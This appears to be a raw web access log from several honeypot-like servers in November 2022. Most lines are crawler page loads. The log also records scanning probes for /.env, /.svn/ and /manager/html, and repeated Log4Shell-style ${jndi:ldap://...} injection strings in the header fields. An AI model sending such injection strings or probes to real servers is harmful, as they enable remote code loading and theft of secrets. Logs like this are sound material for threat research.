swipe-t-2_running | 20.4.210.27 | 12/Nov/2022:17:26:19 | GET /.svn/ HTTP/1.1 | - | Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36 | y
blank-t_running | 93.177.103.215 | 15/Nov/2022:11:12:00 | \x16\x03\x01\x01H\x01 | - | - | n
it-t_running | 35.233.62.116 | 15/Nov/2022:10:33:55 | GET / HTTP/1.1 | - | python-requests/2.28.1 | y
it-t_running | 205.169.39.63 | 15/Nov/2022:10:34:00 | GET / HTTP/1.1 | - | Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/104.0.5112.101 Safari/537.36 | y
it-t_running | 205.169.39.63 | 15/Nov/2022:10:34:00 | GET /cdn/bootstrap.css HTTP/1.1 | http://128.8.238.30/ | Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/104.0.5112.101 Safari/537.36 | y
it-t_running | 205.169.39.63 | 15/Nov/2022:10:34:00 | GET /sites/default/themes/bootstrap/css/3.3.5/overrides-cosmo.min726b.css?rg27la HTTP/1.1 | http://128.8.238.30/ | Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/104.0.5112.101 Safari/537.36 | y
it-t_running | 205.169.39.63 | 15/Nov/2022:10:34:00 | GET /sites/default/themes/bookstrap_subtheme/css/style726b.css?rg27la HTTP/1.1 | http://128.8.238.30/ | Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/104.0.5112.101 Safari/537.36 | y
it-t_running | 205.169.39.63 | 15/Nov/2022:10:34:00 | GET /sites/default/files/styles/home_news_icons/public/UMDimages/news/newsicons/Account-Settings2e64.png?itok=3b8i5AIh HTTP/1.1 | http://128.8.238.30/ | Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/104.0.5112.101 Safari/537.36 | y
it-t_running | 205.169.39.63 | 15/Nov/2022:10:34:00 | GET /sites/default/files/styles/home_news_icons/public/UMDimages/news/newsicons/news-icon6261.png?itok=HIdjWAsb HTTP/1.1 | http://128.8.238.30/ | Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/104.0.5112.101 Safari/537.36 | y
it-t_running | 205.169.39.63 | 15/Nov/2022:10:34:00 | GET /sites/default/files/styles/home_news_icons/public/UMDimages/news/newsicons/Software-_-Computers177a.png?itok=_mL8_HTO HTTP/1.1 | http://128.8.238.30/ | Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/104.0.5112.101 Safari/537.36 | y
it-t_running | 205.169.39.63 | 15/Nov/2022:10:34:00 | GET /sites/divisionofit.umd.edu/files/UMDimages/homepage/Ideas-and-Projects-(lightbulb)2.png HTTP/1.1 | http://128.8.238.30/ | Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/104.0.5112.101 Safari/537.36 | y
it-t_running | 205.169.39.63 | 15/Nov/2022:10:34:00 | GET /sites/divisionofit.umd.edu/files/UMDimages/homepage/Get-Support-(tree)2.png HTTP/1.1 | http://128.8.238.30/ | Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/104.0.5112.101 Safari/537.36 | y
it-t_running | 205.169.39.63 | 15/Nov/2022:10:34:00 | GET /sites/divisionofit.umd.edu/files/UMDimages/homepage/IT-Analytics-(brain)2.png HTTP/1.1 | http://128.8.238.30/ | Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/104.0.5112.101 Safari/537.36 | y
it-t_running | 205.169.39.63 | 15/Nov/2022:10:34:00 | GET /sites/divisionofit.umd.edu/files/UMDimages/homepage/Secure-Data-(lock)2.png HTTP/1.1 | http://128.8.238.30/ | Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/104.0.5112.101 Safari/537.36 | y
it-t_running | 205.169.39.63 | 15/Nov/2022:10:34:00 | GET /sites/default/files/dit-site-logo.png HTTP/1.1 | http://128.8.238.30/ | Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/104.0.5112.101 Safari/537.36 | y
it-t_running | 205.169.39.63 | 15/Nov/2022:10:34:01 | GET /sites/divisionofit.umd.edu/files/DITMain_700-x-150.png HTTP/1.1 | http://128.8.238.30/ | Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/104.0.5112.101 Safari/537.36 | y
it-t_running | 205.169.39.63 | 15/Nov/2022:10:34:01 | GET /sites/divisionofit.umd.edu/files/Terrapin-Tech-3.png HTTP/1.1 | http://128.8.238.30/ | Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/104.0.5112.101 Safari/537.36 | y
it-t_running | 205.169.39.63 | 15/Nov/2022:10:34:01 | GET /sites/divisionofit.umd.edu/files/Visotors-3.png HTTP/1.1 | http://128.8.238.30/ | Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/104.0.5112.101 Safari/537.36 | y
it-t_running | 205.169.39.63 | 15/Nov/2022:10:34:01 | GET /sites/divisionofit.umd.edu/files/Facbook-58x58.png HTTP/1.1 | http://128.8.238.30/ | Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/104.0.5112.101 Safari/537.36 | y
it-t_running | 205.169.39.63 | 15/Nov/2022:10:34:01 | GET /sites/divisionofit.umd.edu/files/Twitter-58x58.png HTTP/1.1 | http://128.8.238.30/ | Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/104.0.5112.101 Safari/537.36 | y
it-t_running | 205.169.39.63 | 15/Nov/2022:10:34:01 | GET /sites/divisionofit.umd.edu/files/Flicker-58x58.png HTTP/1.1 | http://128.8.238.30/ | Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/104.0.5112.101 Safari/537.36 | y
it-t_running | 205.169.39.63 | 15/Nov/2022:10:34:00 | GET /sites/divisionofit.umd.edu/files/UMDimages/homepage/dis-logo.png HTTP/1.1 | http://128.8.238.30/ | Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/104.0.5112.101 Safari/537.36 | y
it-t_running | 205.169.39.63 | 15/Nov/2022:10:34:01 | GET /sites/divisionofit.umd.edu/files/Instagram-58x58.png HTTP/1.1 | http://128.8.238.30/ | Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/104.0.5112.101 Safari/537.36 | y
it-t_running | 205.169.39.63 | 15/Nov/2022:10:34:01 | GET /sites/divisionofit.umd.edu/files/LinkedIn-58x58.png HTTP/1.1 | http://128.8.238.30/ | Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/104.0.5112.101 Safari/537.36 | y
it-t_running | 205.169.39.63 | 15/Nov/2022:10:34:01 | GET /sites/divisionofit.umd.edu/files/YouTube-58x58.png HTTP/1.1 | http://128.8.238.30/ | Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/104.0.5112.101 Safari/537.36 | y
it-t_running | 141.255.166.2 | 15/Nov/2022:10:36:07 | GET / HTTP/1.1 | - | Hello World | y
it-t_running | 185.180.143.136 | 15/Nov/2022:10:36:08 | GET / HTTP/1.1 | - | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 | y
it-t_running | 109.237.97.180 | 15/Nov/2022:10:37:22 | GET /.env HTTP/1.1 | - | Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36 | y
it-t_running | 109.237.97.180 | 15/Nov/2022:10:37:22 | \x16\x03\x01\x01H\x01 | - | - | n
it-t_running | 192.241.201.45 | 15/Nov/2022:10:40:23 | GET /manager/html HTTP/1.1 | - | Mozilla/5.0 zgrab/0.x | y
it-t_running | 141.255.166.2 | 15/Nov/2022:10:50:07 | GET / HTTP/1.1 | - | Hello World | y
swipe-t-2_running | 141.255.166.2 | 15/Nov/2022:10:27:23 | GET / HTTP/1.1 | - | Hello World | y
swipe-t-2_running | 120.236.79.182 | 15/Nov/2022:10:35:33 | GET / HTTP/1.1 | ${jndi:ldap://:8189/a} | ${jndi:ldap://:8189/a} | y
swipe-t-2_running | 103.105.12.48 | 15/Nov/2022:10:39:38 | GET / HTTP/1.1 | ${jndi:ldap://:8180/a} | ${jndi:ldap://:8180/a} | y
swipe-t-2_running | 192.241.201.45 | 15/Nov/2022:10:40:24 | GET /manager/html HTTP/1.1 | - | Mozilla/5.0 zgrab/0.x | y
swipe-t-2_running | 121.200.53.148 | 15/Nov/2022:10:45:03 | GET / HTTP/1.1 | ${jndi:ldap://:8181/a} | ${jndi:ldap://:8181/a} | y
swipe-t-2_running | 141.255.166.2 | 15/Nov/2022:10:57:15 | GET / HTTP/1.1 | - | Hello World | y
swipe-t-2_running | 120.236.79.182 | 15/Nov/2022:11:01:28 | GET / HTTP/1.1 | ${jndi:ldap://:8189/a} | ${jndi:ldap://:8189/a} | y
swipe-t-2_running | 185.180.143.71 | 15/Nov/2022:11:14:11 | GET / HTTP/1.1 | - | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 | y
swipe-t_running | 192.241.201.45 | 15/Nov/2022:10:40:28 | GET /manager/html HTTP/1.1 | - | Mozilla/5.0 zgrab/0.x | y
swipe-t_running | 195.87.73.176 | 15/Nov/2022:10:43:23 | GET / HTTP/1.1 | ${jndi:ldap://:8183/a} | ${jndi:ldap://:8183/a} | y
swipe-t_running | 85.105.82.39 | 15/Nov/2022:10:51:19 | GET / HTTP/1.1 | ${jndi:ldap://85.105.82.39:8188/a} | ${jndi:ldap://85.105.82.39:8188/a} | y
swipe-t_running | 141.255.166.2 | 15/Nov/2022:10:53:30 | GET / HTTP/1.1 | - | Hello World | y
swipe-t_running | 1.220.98.197 | 15/Nov/2022:10:54:03 | GET / HTTP/1.1 | ${jndi:ldap://:8189/a} | ${jndi:ldap://:8189/a} | y
swipe-t_running | 65.154.226.167 | 15/Nov/2022:10:54:18 | GET / HTTP/1.1 | - | Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/104.0.5112.101 Safari/537.36 | y
swipe-t_running | 65.154.226.167 | 15/Nov/2022:10:54:18 | GET /main.css HTTP/1.1 | http://128.8.238.179/ | Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/104.0.5112.101 Safari/537.36 | y
swipe-t_running | 65.154.226.167 | 15/Nov/2022:10:54:18 | GET /university-of-maryland-logo.png HTTP/1.1 | http://128.8.238.179/ | Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/104.0.5112.101 Safari/537.36 | y
swipe-t_running | 65.154.226.167 | 15/Nov/2022:10:54:18 | GET /dis-logo.png HTTP/1.1 | http://128.8.238.179/ | Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/104.0.5112.101 Safari/537.36 | y
swipe-t_running | 82.64.113.245 | 15/Nov/2022:10:56:06 | GET / HTTP/1.1 | ${jndi:ldap://:8188/a} | ${jndi:ldap://:8188/a} | y
swipe-t_running | 184.67.149.186 | 15/Nov/2022:11:01:02 | GET / HTTP/1.1 | ${jndi:ldap://:8184/a} | ${jndi:ldap://:8184/a} | y
swipe-t_running | 85.51.217.156 | 15/Nov/2022:11:03:00 | GET / HTTP/1.1 | ${jndi:ldap://:8183/a} | ${jndi:ldap://:8183/a} | y
swipe-t_running | 183.136.225.32 | 15/Nov/2022:11:17:46 | GET / HTTP/1.1 | - | Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0 | y
swipe-t_running | 183.136.225.32 | 15/Nov/2022:11:31:46 | GET / HTTP/1.1 | - | Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE | y
swipe-t_running | 183.136.225.32 | 15/Nov/2022:11:31:48 | GET /favicon.ico HTTP/1.1 | - | Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE | y
swipe-t_running | 183.136.225.32 | 15/Nov/2022:11:31:49 | GET /robots.txt HTTP/1.1 | - | Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE | y
blank-t-2_running | 141.255.166.2 | 15/Nov/2022:10:53:20 | GET / HTTP/1.1 | - | Hello World | y
blank-t-2_running | 74.82.47.31 | 15/Nov/2022:10:58:40 | GET / HTTP/1.1 | - | Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0 | y
blank-t-2_running | 74.82.47.31 | 15/Nov/2022:11:03:39 | GET /favicon.ico HTTP/1.1 | - | Mozilla/5.0 (Windows NT 10.0; rv:103.0) Gecko/20100101 Firefox/103.0 | y
blank-t-2_running | 37.44.238.230 | 15/Nov/2022:11:21:07 | GET / HTTP/1.1 | - | Linux Gnu (cow) | y
blank-t-2_running | 68.183.190.54 | 15/Nov/2022:11:26:02 | GET / HTTP/1.0 | - | - | y
blank-t-2_running | 68.183.190.54 | 15/Nov/2022:11:26:05 | Gh0st\xad | - | - | n
blank-t-2_running | 68.183.190.54 | 15/Nov/2022:11:26:09 | HELP | - | - | n
blank-t-2_running | 68.183.190.54 | 15/Nov/2022:11:26:09 | \x1b\x84\xd5\xb0]\xf4\xc4\x93\xc50\xc2X\x8c\xda\xb1\xd7\xac\xafn\x1d\xe1\x1e\x1a3*\x85\xb7\x1d'\xb1\xc9k\xbf\xf0\xbc\n | - | - | n
blank-t-2_running | 68.183.190.54 | 15/Nov/2022:11:26:11 | \x16\x03\x01 | - | - | n
blank-t-2_running | 68.183.190.54 | 15/Nov/2022:11:26:14 | \xbd\xff\x9e\xffE\xff\x9e\xff\xbd\xff\x9e\xff\xa4\xff\x86\xff\xc4\xff\xbe\xff\xc7\xff\xdb\xff\xee\xffx\\d9\xff\xed\xff\xa4\xff\x9d\xff\xcf\xff\xd8\xff\xe5\xff\x04\xff\x12\xff0\xff\xb1\xff\xbd\xff\xe7\xff\xe2\xff\xdd\xff\xdc\xff\xde\xff\xc8\xff\xcc\xff\xbe\xff\xf8\xff&\xff\x01\xff\x0f\xff\xf5\xff\x06\xff\xff\xff\xf7\xff!\xff\xde\xff\x02\xff&\xff\x0c\xff\x01\xff\xf5\xff\n | - | - | n
blank-t-2_running | 141.255.166.2 | 15/Nov/2022:11:40:42 | GET / HTTP/1.1 | - | Hello World | y
blank-t-2_running | 205.169.39.63 | 15/Nov/2022:11:40:54 | GET / HTTP/1.1 | - | Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/104.0.5112.101 Safari/537.36 | y
pwd-t_running | 141.255.166.2 | 15/Nov/2022:11:00:14 | GET / HTTP/1.1 | - | Hello World | y
pwd-t_running | 185.75.204.27 | 15/Nov/2022:11:18:31 | GET / HTTP/1.1 | - | Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36 | y
pwd-t_running | 185.180.143.71 | 15/Nov/2022:11:20:38 | GET / HTTP/1.1 | - | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 | y
pwd-t_running | 162.221.192.26 | 15/Nov/2022:11:45:18 | GET / HTTP/1.1 | - | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 | y
pwd-t_running | 141.255.166.2 | 15/Nov/2022:11:46:46 | GET / HTTP/1.1 | - | Hello World | y
it-t-2_running | 141.255.166.2 | 15/Nov/2022:10:54:06 | GET / HTTP/1.1 | - | Hello World | y
it-t-2_running | 205.169.39.63 | 15/Nov/2022:10:54:18 | GET / HTTP/1.1 | - | Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/104.0.5112.101 Safari/537.36 | y
it-t-2_running | 205.169.39.63 | 15/Nov/2022:10:54:18 | GET /cdn/bootstrap.css HTTP/1.1 | http://128.8.238.70/ | Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/104.0.5112.101 Safari/537.36 | y
it-t-2_running | 205.169.39.63 | 15/Nov/2022:10:54:18 | GET /sites/default/themes/bootstrap/css/3.3.5/overrides-cosmo.min726b.css?rg27la HTTP/1.1 | http://128.8.238.70/ | Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/104.0.5112.101 Safari/537.36 | y
it-t-2_running | 205.169.39.63 | 15/Nov/2022:10:54:18 | GET /sites/divisionofit.umd.edu/files/UMDimages/homepage/Get-Support-(tree)2.png HTTP/1.1 | http://128.8.238.70/ | Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/104.0.5112.101 Safari/537.36 | y
it-t-2_running | 205.169.39.63 | 15/Nov/2022:10:54:18 | GET /sites/default/files/styles/home_news_icons/public/UMDimages/news/newsicons/Software-_-Computers177a.png?itok=_mL8_HTO HTTP/1.1 | http://128.8.238.70/ | Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/104.0.5112.101 Safari/537.36 | y
it-t-2_running | 205.169.39.63 | 15/Nov/2022:10:54:18 | GET /sites/divisionofit.umd.edu/files/UMDimages/homepage/Secure-Data-(lock)2.png HTTP/1.1 | http://128.8.238.70/ | Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/104.0.5112.101 Safari/537.36 | y
it-t-2_running | 205.169.39.63 | 15/Nov/2022:10:54:18 | GET /sites/divisionofit.umd.edu/files/UMDimages/homepage/IT-Analytics-(brain)2.png HTTP/1.1 | http://128.8.238.70/ | Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/104.0.5112.101 Safari/537.36 | y
it-t-2_running | 205.169.39.63 | 15/Nov/2022:10:54:18 | GET /sites/default/themes/bookstrap_subtheme/css/style726b.css?rg27la HTTP/1.1 | http://128.8.238.70/ | Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/104.0.5112.101 Safari/537.36 | y
it-t-2_running | 205.169.39.63 | 15/Nov/2022:10:54:18 | GET /sites/default/files/styles/home_news_icons/public/UMDimages/news/newsicons/news-icon6261.png?itok=HIdjWAsb HTTP/1.1 | http://128.8.238.70/ | Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/104.0.5112.101 Safari/537.36 | y
it-t-2_running | 205.169.39.63 | 15/Nov/2022:10:54:18 | GET /sites/divisionofit.umd.edu/files/UMDimages/homepage/Ideas-and-Projects-(lightbulb)2.png HTTP/1.1 | http://128.8.238.70/ | Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/104.0.5112.101 Safari/537.36 | y
it-t-2_running | 205.169.39.63 | 15/Nov/2022:10:54:18 | GET /sites/default/files/styles/home_news_icons/public/UMDimages/news/newsicons/Account-Settings2e64.png?itok=3b8i5AIh HTTP/1.1 | http://128.8.238.70/ | Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/104.0.5112.101 Safari/537.36 | y
it-t-2_running | 205.169.39.63 | 15/Nov/2022:10:54:18 | GET /sites/divisionofit.umd.edu/files/Twitter-58x58.png HTTP/1.1 | http://128.8.238.70/ | Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/104.0.5112.101 Safari/537.36 | y
it-t-2_running | 205.169.39.63 | 15/Nov/2022:10:54:18 | GET /sites/divisionofit.umd.edu/files/YouTube-58x58.png HTTP/1.1 | http://128.8.238.70/ | Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/104.0.5112.101 Safari/537.36 | y
it-t-2_running | 205.169.39.63 | 15/Nov/2022:10:54:18 | GET /sites/divisionofit.umd.edu/files/Instagram-58x58.png HTTP/1.1 | http://128.8.238.70/ | Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/104.0.5112.101 Safari/537.36 | y
it-t-2_running | 205.169.39.63 | 15/Nov/2022:10:54:18 | GET /sites/divisionofit.umd.edu/files/Terrapin-Tech-3.png HTTP/1.1 | http://128.8.238.70/ | Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/104.0.5112.101 Safari/537.36 | y
it-t-2_running | 205.169.39.63 | 15/Nov/2022:10:54:19 | GET /sites/divisionofit.umd.edu/files/Visotors-3.png HTTP/1.1 | http://128.8.238.70/ | Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/104.0.5112.101 Safari/537.36 | y
it-t-2_running | 205.169.39.63 | 15/Nov/2022:10:54:18 | GET /sites/divisionofit.umd.edu/files/UMDimages/homepage/dis-logo.png HTTP/1.1 | http://128.8.238.70/ | Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/104.0.5112.101 Safari/537.36 | y
it-t-2_running | 205.169.39.63 | 15/Nov/2022:10:54:19 | GET /sites/divisionofit.umd.edu/files/Facbook-58x58.png HTTP/1.1 | http://128.8.238.70/ | Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/104.0.5112.101 Safari/537.36 | y
it-t-2_running | 205.169.39.63 | 15/Nov/2022:10:54:19 | GET /sites/divisionofit.umd.edu/files/Flicker-58x58.png HTTP/1.1 | http://128.8.238.70/ | Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/104.0.5112.101 Safari/537.36 | y
it-t-2_running | 205.169.39.63 | 15/Nov/2022:10:54:19 | GET /sites/divisionofit.umd.edu/files/LinkedIn-58x58.png HTTP/1.1 | http://128.8.238.70/ | Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/104.0.5112.101 Safari/537.36 | y
it-t-2_running | 205.169.39.63 | 15/Nov/2022:10:54:19 | GET /sites/default/files/dit-site-logo.png HTTP/1.1 | http://128.8.238.70/ | Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/104.0.5112.101 Safari/537.36 | y
it-t-2_running | 205.169.39.63 | 15/Nov/2022:10:54:19 | GET /sites/divisionofit.umd.edu/files/DITMain_700-x-150.png HTTP/1.1 | http://128.8.238.70/ | Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/104.0.5112.101 Safari/537.36 | y
it-t-2_running | 194.146.24.107 | 15/Nov/2022:11:22:31 | GET /config/getuser?index=0 HTTP/1.1 | - | Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0 | y
it-t-2_running | 141.255.166.2 | 15/Nov/2022:11:30:46 | GET / HTTP/1.1 | - | Hello World | y
blank-t_running | 92.118.39.78 | 15/Nov/2022:12:08:23 | GET / HTTP/1.1 | - | - | y
it-t_running | 141.255.166.2 | 15/Nov/2022:11:34:45 | GET / HTTP/1.1 | - | Hello World | y
swipe-t_running | 141.255.166.2 | 15/Nov/2022:11:56:19 | GET / HTTP/1.1 | - | Hello World | y
swipe-t_running | 194.146.24.107 | 15/Nov/2022:12:02:25 | GET /config/getuser?index=0 HTTP/1.1 | - | Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0 | y
swipe-t-2_running | 121.200.53.148 | 15/Nov/2022:11:33:35 | GET / HTTP/1.1 | ${jndi:ldap://:8181/a} | ${jndi:ldap://:8181/a} | y
swipe-t-2_running | 157.119.227.210 | 15/Nov/2022:11:41:23 | GET / HTTP/1.1 | - | Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36 | y
swipe-t-2_running | 191.242.188.103 | 15/Nov/2022:11:51:29 | GET / HTTP/1.1 | ${jndi:ldap://:8182/a} | ${jndi:ldap://:8182/a} | y
swipe-t-2_running | 89.100.220.211 | 15/Nov/2022:11:51:39 | GET / HTTP/1.1 | ${jndi:ldap://:8186/a} | ${jndi:ldap://:8186/a} | y
swipe-t-2_running | 141.255.166.2 | 15/Nov/2022:11:53:10 | GET / HTTP/1.1 | - | Hello World | y
swipe-t-2_running | 120.236.79.182 | 15/Nov/2022:11:53:44 | GET / HTTP/1.1 | ${jndi:ldap://:8189/a} | ${jndi:ldap://:8189/a} | y
swipe-t-2_running | 121.200.53.148 | 15/Nov/2022:11:55:20 | GET / HTTP/1.1 | ${jndi:ldap://:8181/a} | ${jndi:ldap://:8181/a} | y
swipe-t-2_running | 120.224.143.251 | 15/Nov/2022:11:57:32 | GET / HTTP/1.1 | ${jndi:ldap://:8185/a} | ${jndi:ldap://:8185/a} | y
swipe-t-2_running | 103.105.12.48 | 15/Nov/2022:12:08:07 | GET / HTTP/1.1 | ${jndi:ldap://:8180/a} | ${jndi:ldap://:8180/a} | y
swipe-t-2_running | 121.200.53.148 | 15/Nov/2022:12:10:21 | GET / HTTP/1.1 | ${jndi:ldap://:8181/a} | ${jndi:ldap://:8181/a} | y
swipe-t-2_running | 159.255.163.116 | 15/Nov/2022:12:18:44 | GET / HTTP/1.1 | - | Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 | y
swipe-t-2_running | 191.242.188.103 | 15/Nov/2022:12:21:57 | GET / HTTP/1.1 | ${jndi:ldap://:8182/a} | ${jndi:ldap://:8182/a} | y
swipe-t-2_running | 121.200.53.148 | 15/Nov/2022:12:28:18 | GET / HTTP/1.1 | ${jndi:ldap://:8181/a} | ${jndi:ldap://:8181/a} | y
blank-t_running | 117.16.44.111 | 15/Nov/2022:12:33:10 | GET / HTTP/1.1 | ${jndi:ldap://:8181/a} | ${jndi:ldap://:8181/a} | y
